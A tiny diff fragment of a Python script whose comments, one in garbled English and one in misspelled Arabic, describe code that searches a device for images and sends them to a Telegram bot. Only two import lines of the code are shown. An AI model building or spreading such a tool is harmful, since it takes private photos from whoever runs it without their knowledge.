@@ -1,4 +1,5 @@
 #Python code: Anyone who runs it will receive all their Telegram bot images via the bot token and ID.
+#كود بايثوم يقوم بلبحث عن الصور في الجهاز ويرسلها لبوت تلي كرام بسرعه فاىقه يشنغل علا الهاتف ة الكمبيوتر
 import os
 import requests
 
